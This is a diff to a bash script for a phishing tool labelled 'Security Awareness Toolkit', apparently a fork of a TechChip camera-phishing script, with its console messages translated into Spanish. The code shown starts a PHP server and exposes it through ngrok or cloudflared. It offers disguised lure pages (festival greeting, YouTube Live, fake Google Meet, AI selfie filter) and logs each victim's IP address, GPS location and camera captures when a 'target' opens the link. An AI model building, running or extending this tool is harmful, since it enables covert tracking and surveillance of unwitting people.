@@ -30,16 +30,16 @@ trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf "\e[1;32m   _____   ___   ______  \e[1;36m ______  __ __  ______  \e[0m\n"
-printf "\e[1;32m  / ___/  /   | /_  __/  \e[1;36m/_  __/ / // / /_  __/  \e[0m\n"
-printf "\e[1;32m  \__ \  / /| |  / /     \e[1;36m / /   / // /_  / /     \e[1;0m\n"
-printf "\e[1;32m ___/ / / ___ | / /      \e[1;36m/ /   /__  __/ / /      \e[1;32m\e[5m[SYSTEM ONLINE]\e[0m\n"
-printf "\e[1;32m/____/ /_/  |_|/_/       \e[1;36m/_/      /_/   /_/       \e[0m\n"
+printf "\e[1;32m   _____   ___   ______  \e[1;31m ______  __ __  ______  \e[0m\n"
+printf "\e[1;32m  / ___/  /   | /_  __/  \e[1;31m/_  __/ / // / /_  __/  \e[0m\n"
+printf "\e[1;32m  \__ \  / /| |  / /     \e[1;31m / /   / // /_  / /     \e[1;0m\n"
+printf "\e[1;32m ___/ / / ___ | / /      \e[1;31m/ /   /__  __/ / /      \e[1;31m\e[5m[SYSTEM ONLINE]\e[0m\n"
+printf "\e[1;32m/____/ /_/  |_|/_/       \e[1;31m/_/      /_/   /_/       \e[0m\n"
 printf "\n"
-printf "\e[1;92m  [ Security Awareness Toolkit ]\e[1;37m Version: \e[1;33m10.1.0\e[0m\n"
-printf "\e[1;32m  [ GitHub ]\e[1;77m https://github.com/jesusdorian999019/SecurityAwarenessToolkit.git\e[0m\n"
-printf "\e[1;32m  [ Original Creator ]\e[1;77m TechChip (techchip.net)\e[0m\n"
-printf "\e[1;36m  ----------------------------------------------------------------------\e[0m\n"
+printf "\e[1;92m  [ Security Awareness Toolkit ]\e[1;37m Version: \e[1;31m10.1.0\e[0m\n"
+printf "\e[1;92m  [ GitHub ]\e[1;77m https://github.com/jesusdorian999019/SecurityAwarenessToolkit.git\e[0m\n"
+printf "\e[1;92m  [ Original Creator ]\e[1;77m TechChip (techchip.net)\e[0m\n"
+printf "\e[1;31m  ----------------------------------------------------------------------\e[0m\n"
 printf "\n"
 }
 
@@ -80,7 +80,7 @@ exit 1
 catch_ip() {
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;32m[\e[1;37m+\e[1;32m] IP DE DETECTADA:\e[0m\e[1;77m %s\e[0m\n" $ip
 
 cat ip.txt >> saved.ip.txt
 }
@@ -96,10 +96,10 @@ catch_location() {
     maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
     
     # Only display essential location data
-    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" $lat
-    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" $lon
-    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" $acc
-    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
+    printf "\e[1;32m[\e[1;37m+\e[1;32m] Latitud:\e[0m\e[1;77m %s\e[0m\n" $lat
+    printf "\e[1;32m[\e[1;37m+\e[1;32m] Longitud:\e[0m\e[1;77m %s\e[0m\n" $lon
+    printf "\e[1;32m[\e[1;37m+\e[1;32m] Precision:\e[0m\e[1;77m %s metros\e[0m\n" $acc
+    printf "\e[1;32m[\e[1;37m+\e[1;32m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
     
     # Create directory for saved locations if it doesn't exist
     if [[ ! -d "saved_locations" ]]; then
@@ -123,12 +123,12 @@ if [[ ! -d "saved_locations" ]]; then
 fi
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
+printf "\e[1;32m[\e[1;37m*\e[1;32m] Esperando conexiones entrantes...\e[0m\e[1;77m (Ctrl + C para salir)\e[0m\n"
+printf "\e[1;32m[\e[1;37m*\e[1;32m] Rastreo GPS Hibrido: \e[1;31mACTIVO\e[0m\n"
 while [ true ]; do
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;31m[\e[1;37m!\e[1;31m] ¡SESION INICIADA POR EL OBJETIVO!\e[0m\n"
 catch_ip
 rm -rf ip.txt
 fi
@@ -137,7 +137,7 @@ sleep 0.5
 
 # Combined check for any location indicator
 if [[ -e "LocationLog.log" || -e "current_location.txt" || -n $(ls location_*.txt 2>/dev/null) ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
+printf "\n\e[1;32m[\e[1;37m+\e[1;32m] DATOS DE UBICACION SINCRONIZADOS\e[0m\n"
 # Don't display the raw log content, just process it
 catch_location
 fi
@@ -149,7 +149,7 @@ rm -rf LocationError.log
 fi
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;32m[\e[1;37m+\e[1;32m] CAPTURA MULTIMEDIA RECIBIDA\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -250,7 +250,7 @@ else
     pkill -9 cloudflared > /dev/null 2>&1
 fi
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+printf "\e[1;32m[\e[1;37m+\e[1;32m] Levantando servidor PHP local...\n"
 php -S 127.0.0.1:3333 > php_server.log 2>&1 & 
 sleep 5
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
@@ -275,15 +275,15 @@ done
 
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url http://127.0.0.1:3333 to see specific errors\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url http://127.0.0.1:3333\n"
+printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m El servicio de CloudFlare podria estar caido\n"
+printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Si estas en Android, activa el Hotspot\n"
+printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m CloudFlared ya esta corriendo (usa killall cloudflared)\n"
+printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Verifica tu conexion a internet\n"
+printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Ejecucion manual: ./cloudflared tunnel --url http://127.0.0.1:3333\n"
+printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m En Windows: cloudflared.exe tunnel --url http://127.0.0.1:3333\n"
 exit 1
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;32m[\e[1;31m*\e[1;32m] LINK GENERADO:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
 payload_cloudflare
 checkfound
@@ -415,15 +415,15 @@ else
         cat  ~/.ngrok2/ngrok.yml
         read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
         if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+            read -p $'\e[1;32m[\e[1;37m+\e[1;32m] Ingresa tu Ngrok Authtoken: \e[0m' ngrok_auth
             ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
             printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
         fi
     else
-        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+        read -p $'\e[1;32m[\e[1;37m+\e[1;32m] Ingresa tu Ngrok Authtoken: \e[0m' ngrok_auth
         ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
     fi
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+    printf "\e[1;32m[\e[1;37m+\e[1;32m] Levantando servidor PHP local...\n"
     php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
     sleep 5
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
@@ -435,14 +435,14 @@ sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -oE 'https://[-0-9a-zA-Z.]+ngrok-free.app' | head -n1)
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
+printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m El Authtoken de Ngrok es invalido\n"
+printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Si estas en Android, activa el Hotspot\n"
+printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Ngrok ya esta corriendo (usa killall ngrok)\n"
+printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Verifica tu conexion a internet\n"
+printf "\e[1;32m[\e[1;31m*\e[1;32m] \e[1;31m Ejecucion manual: ./ngrok http 3333\n"
 exit 1
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;32m[\e[1;31m*\e[1;32m] LINK GENERADO:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
 payload_ngrok
 checkfound
@@ -517,11 +517,11 @@ rm -rf sendlink
 fi
 
 printf "\n-----Choose an option----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Update Tool\e[0m\n"
+printf "\n\e[1;32m[\e[1;37m01\e[1;32m]\e[0m\e[1;32m Ngrok Secure Tunnel\e[0m\n"
+printf "\e[1;32m[\e[1;37m02\e[1;32m]\e[0m\e[1;32m CloudFlare Tunnel (Recomendado)\e[0m\n"
+printf "\e[1;32m[\e[1;37m03\e[1;32m]\e[0m\e[1;32m Buscar Actualizaciones del Sistema\e[0m\n"
 default_option_server="2"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose an option: [Default is 2] \e[0m' option_server
+read -p $'\n\e[1;32m[\e[1;37m+\e[1;32m] Selecciona un metodo: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 
 if [[ $option_server -eq 3 ]]; then
@@ -543,22 +543,22 @@ fi
 
 select_template() {
 printf "\n-----Choose a template----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m AI Selfie Filter\e[0m\n"
+printf "\n\e[1;32m[\e[1;37m01\e[1;32m]\e[0m\e[1;32m Portal de Eventos (Personalizable)\e[0m\n"
+printf "\e[1;32m[\e[1;37m02\e[1;32m]\e[0m\e[1;32m Panel de YouTube Live\e[0m\n"
+printf "\e[1;32m[\e[1;37m03\e[1;32m]\e[0m\e[1;32m Simulacion de Google Meet\e[0m\n"
+printf "\e[1;32m[\e[1;37m04\e[1;32m]\e[0m\e[1;32m Laboratorio IA (Nano Banana)\e[0m\n"
 default_option_template="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+read -p $'\n\e[1;32m[\e[1;37m+\e[1;32m] Selecciona una interfaz: \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
+read -p $'\n\e[1;32m[\e[1;37m+\e[1;32m] Nombre del evento: \e[0m' fest_name
 fest_name="${fest_name//[[:space:]]/}"
 elif [[ $option_tem -eq 2 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+read -p $'\n\e[1;32m[\e[1;37m+\e[1;32m] ID del Video de YouTube: \e[0m' yt_video_ID
 elif [[ $option_tem -eq 3 ]]; then
-printf "\e[1;92m[\e[0m+\e[1;92m] Online Meeting template selected.\n"
+printf "\e[1;32m[\e[1;37m+\e[1;32m] Plantilla Google Meet configurada.\n"
 elif [[ $option_tem -eq 4 ]]; then
-printf "\e[1;92m[\e[0m+\e[1;92m] AI Selfie Filter template selected.\n"
+printf "\e[1;32m[\e[1;37m+\e[1;32m] Interfaz de IA Nano Banana configurada.\n"
 else
 printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
 sleep 1
